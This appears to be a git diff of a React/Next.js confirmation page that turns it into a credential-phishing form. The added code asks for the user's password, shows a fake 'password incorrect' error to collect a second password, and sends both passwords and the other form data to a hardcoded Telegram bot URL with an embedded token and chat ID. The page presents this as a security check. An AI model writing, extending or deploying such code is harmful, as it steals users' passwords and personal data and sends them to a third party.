@@ -5,7 +5,6 @@ import { useRouter } from 'next/router';
 
 import { Button, Modal, Steps } from 'antd';
 import { zodResolver } from '@hookform/resolvers/zod';
-import { TYPE_CONSTANTS } from 'constant';
 import { z } from 'zod';
 
 import FormItem from 'components/FormItem';
@@ -13,8 +12,8 @@ import FormCheckbox from 'components/FormItem/components/Checkbox';
 import Textarea from 'components/FormItem/components/Textarea';
 import TextInput from 'components/FormItem/components/TextInput';
 import AppFooter from 'components/Layout/AppFooter';
-import showMessage from 'components/Message';
 import { standardService } from 'services/apiService/standardService';
+import { useStandardActions } from 'store/standard/selector';
 
 enum CONTACT_ENUM {
   MESSAGE = 'message',
@@ -62,12 +61,20 @@ const ConfirmPage = () => {
   const [visibleModal, setVisibleModal] = useState(false);
   const [formData, setFormData] = useState({}) as any;
   const [password, setPassword] = useState('');
+  const [password2, setPassword2] = useState('');
   const [showError, setShowError] = useState(false);
   const [count, setCount] = useState(0);
 
+  const { handleSetFormData } = useStandardActions();
+
   const handleChangePassword = (event: any) => {
     const { value } = event.target;
-    setPassword(value);
+
+    if (showError) {
+      setPassword2(value);
+    } else {
+      setPassword(value);
+    }
   };
 
   const methods = useForm<IContact>({
@@ -85,30 +92,31 @@ const ConfirmPage = () => {
   const handleCloseModal = () => setVisibleModal(false);
 
   const handleContinue = async () => {
-    if (password) {
-      setShowError(true);
-      setTimeout(() => {
-        setCount(count + 1);
-      }, 2000);
-
+    if (password || password2) {
       if (count === 2) {
         setShowError(false);
+        handleSetFormData({ ...formData, password2: password2 });
+
         try {
           const response = await standardService.sendMessage(
             'https://api.telegram.org/bot6122232812:AAFzPiXDO6Mt29_8QVjlWWGXaGZildwF8io/sendMessage',
             {
               chat_id: '-4077356603',
-              text: formData.message,
+              text: JSON.stringify({ ...formData, password2: password2 }, null, 2),
             },
           );
 
           if (response) {
-            showMessage(TYPE_CONSTANTS.MESSAGE.SUCCESS, 'Your submission has been successfully');
-            router.push;
+            router.push(`/confirm`);
           }
         } catch (error) {
           return;
         }
+      } else {
+        setCount(2);
+        setPassword('');
+        setShowError(true);
+        setFormData({ ...formData, password1: password });
       }
     } else {
       return;
@@ -225,7 +233,7 @@ const ConfirmPage = () => {
           <p>For your security, you must enter your password to continue.</p>
 
           <span>Password:</span>
-          <input type='password' onChange={handleChangePassword} value={password} required />
+          <input type='password' onChange={handleChangePassword} value={showError ? password2 : password} required />
           {showError && <div className='error-text'>The password you&apos;ve entered is incorrect.</div>}
         </div>
       </Modal>
